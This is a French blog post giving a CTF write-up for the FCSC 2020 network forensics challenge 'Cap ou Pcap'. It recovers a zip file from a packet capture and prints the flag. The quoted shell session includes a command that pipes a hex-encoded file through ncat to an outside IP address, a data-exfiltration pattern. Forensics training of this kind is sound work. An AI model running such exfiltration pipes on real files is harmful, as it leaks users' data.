---
layout: post
title:  "Writeup - FCSC-2020 - Intro - Cap ou Pcap"
date:   2020-05-05 19:00:02 +0200
categories: [writeup]
author: Vixepti
image: /assets/2020/05/FCSC.png
tags: [FCSC, ctf, writeup, forensic]
---

Writeup sur une épreuve d'introduction réseau du *France Cybersecurity Challenge 2020*. Simple mais intéressant.<!--more-->

# Énoncé
> Voici la capture d’une communication réseau entre deux postes. Un fichier a été échangé et vous devez le retrouver.
>
> Le flag est présent dans le contenu du fichier.

# Solution

On a un fichier .pcap, je l'ouvre dans wireshark et dans *Analyser* -> *Suivre* -> *Flux TCP* :

- Le premier flux affiche :

{% highlight generic %}
id
uid=1001(fcsc) gid=1001(fcsc) groups=1001(fcsc)
pwd
/home/fcsc
w
 07:10:25 up 24 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
fcsc     tty7     :0               06:46   24:47   3.13s  0.00s /bin/sh /etc/xdg/xfce4/xinitrc -- /etc/X11/xinit/xserverrc
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
ls Documents
flag.zip
file Documents/flag.zip
Documents/flag.zip: Zip archive data, at least v2.0 to extract
xxd -p Documents/flag.zip | tr -d '\n' | ncat 172.20.20.133 20200
exit
{% endhighlight %}

On voit qu'une archive zip a été transférée.

- Je récupère les données dans le second flux :

{% highlight generic %}
504b0304140000000800a231825065235c39420000004700000008001c00666c61672e7478745554090003bfc8855ebfc8855e75780b000104e803000004e80300000dc9c11180300804c0bfd5840408bc33630356e00568c2b177ddef9eeb5a8fe6ee06ce8e5684f0845997192aad44ecaedc7f8e1acc4e3ec1a8eda164d48c28c77b7c504b01021e03140000000800a231825065235c394200000047000000080018000000000001000000a48100000000666c61672e7478745554050003bfc8855e75780b000104e803000004e8030000504b050600000000010001004e000000840000000000
{% endhighlight %}

Puis je passe ces données dans Cyberchef :

{:refdef: style="text-align: center;"}
![Cap ou Pcap - Filetype](/assets/2020/05/cappcap-cyberchef-filetype.png)
{: refdef}

On a bien notre fichier ZIP. J'enregistre la sortie et j'affiche le contenu du fichier flag enregistré dans l'archive :

{% highlight shell_session %}
[vixepti@computer]$ unzip flag.zip 
Archive:  flag.zip
  inflating: flag.txt                
[vixepti@computer]$ cat flag.txt 
FCSC{6ec28b4e2b0f1bd9eb88257d650f558afec4e23f3449197b4bfc9d61810811e3}
[vixepti@computer]$ 

{% endhighlight %}

# Flag

Le flag est donc : ***FCSC{6ec28b4e2b0f1bd9eb88257d650f558afec4e23f3449197b4bfc9d61810811e3}***